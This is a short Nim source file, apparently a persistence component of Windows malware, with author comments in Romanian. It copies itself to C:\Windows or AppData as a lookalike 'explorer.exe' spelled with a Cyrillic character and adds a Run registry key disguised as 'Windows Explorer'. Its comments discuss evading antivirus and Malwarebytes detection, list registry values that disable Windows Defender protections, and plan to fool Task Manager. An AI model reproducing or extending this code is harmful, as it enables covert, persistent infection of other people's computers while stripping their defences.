from os import getAppFilename
from os import copyFile
from os import getEnv
from os import joinPath

import setRegKey
import delRegKey
import isAdmin

proc run*(): void =
  # hide the console window

  # copy file to appdata
  let filename: string = getAppFilename()
  # let dest: string =
  var dest: string

  if isAdmin():
    # ma detecteaza antivirusul la windows ca svchost e
    # scris cu chiril si seamana cu cv fisier windows
    # trebuie sa vad sa gasesc alt nume credibil
    dest = r"C:\Windows".joinPath("explоrer.exe")
  else:
    # ma detecteaza mallwarebytes daca stau in appdata
    dest = getEnv("appdata").joinPath("explоrer.exe")

  # imi da crash programul daca incerc sa i dau replace dar el e deschis
  if filename != dest:
    copyFile(filename, dest)

  ## INTERESANT: REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
  ## vezi ca trb sa aiba val 1
  ## https://www.windowscentral.com/how-permanently-disable-windows-defender-antivirus-windows-10
  ## cred ca creez cv key Real-Time Protection folder 1
  ##  -> DisableBehaviorMonitoring DWORD 1
  ##  -> DisableOnAccessProtection  DWORD 1
  ##  -> DisableScanOnRealtimeEnable DWORD 1
  ##

  ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
  ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
  setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
      "Windows Explorer", dest)
  # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bl2", dest)
  # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
  #     "client bla")
